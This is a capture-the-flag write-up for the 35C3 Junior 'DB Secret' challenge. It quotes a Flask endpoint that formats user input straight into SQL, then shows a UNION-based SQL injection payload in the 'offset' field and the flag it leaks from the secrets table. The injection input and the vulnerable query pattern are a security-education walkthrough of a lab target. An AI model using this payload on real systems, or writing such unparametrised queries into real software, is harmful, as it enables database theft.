# DB Secret

> Solves:61
> To enable secure microservices (or whatever, we don't know yet) over Wee in the future, we created a specific DB_SECRET, only known to us. This token is super important and extremely secret, hence the name. The only way an attacker could get hold of it is to serve good booze to the admins. Pretty sure it's otherwise well protected on our secure server.

>http://35.207.132.47/

> Difficulty Estimate: Medium

## Analysis

This is another challenge from wee series of challenges so we do have access to source code in /pyserver/server.py .
No flag giving mechanism is discovered upon source code examination, but we know that flag is stored in database:

```python
db.execute("INSERT INTO secrets(secret) values(?)", (DB_SECRET,))
```
This means we need to access database , pointing us to SQL injection vulnerability.

## Solution

Note: you need to be logged in in order for this solution to work, see (logged in writeup)[https://github.com/HackThisSite/CTF-Writeups/tree/master/2018/35C3-Junior/Logged-in]

I examined each query in code and most used secured parametrised statements, except one!

```python
@app.route("/api/getprojectsadmin", methods=["POST"])
def getprojectsadmin():
    # ProjectsRequest request = ctx.bodyAsClass(ProjectsRequest.class);
    # ctx.json(paperbots.getProjectsAdmin(ctx.cookie("token"), request.sorting, request.dateOffset));
    name = request.cookies["name"]
    token = request.cookies["token"]
    user, username, email, usertype = user_by_token(token)

    json = request.get_json(force=True)
    offset = json["offset"]
    sorting = json["sorting"]

    if name != "admin":
        raise Exception("InvalidUserName")

    sortings = {
        "newest": "created DESC",
        "oldest": "created ASC",
        "lastmodified": "lastModified DESC"
    }
    sql_sorting = sortings[sorting]

    if not offset:
        offset = datetime.datetime.now()

    return jsonify_projects(query_db(
        "SELECT code, userName, title, public, type, lastModified, created, content FROM projects WHERE created < '{}' "
	"ORDER BY {} LIMIT 10".format(offset, sql_sorting), one=False), username, "admin")
```
/api/getprojectsadmin has 2 json POST parameters offset and sorting, we can use offset parameter for UNION based SQL injection!

I sent following POST data (again don't forget you need to have name and token cookie aka you need to be logged in):
```
{"offset":"' UNION SELECT secret,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM secrets WHERE '1'='1", "sorting":"newest"}
```

Which gave result:
```
[{"code":"35C3_ALL_THESE_YEARS_AND_WE_STILL_HAVE_INJECTIONS_EVERYWHERE__HOW???","content":null,"created":null,"lastModified":null,"public":null,"title":null,"type":null,"userName":null}]
```
 
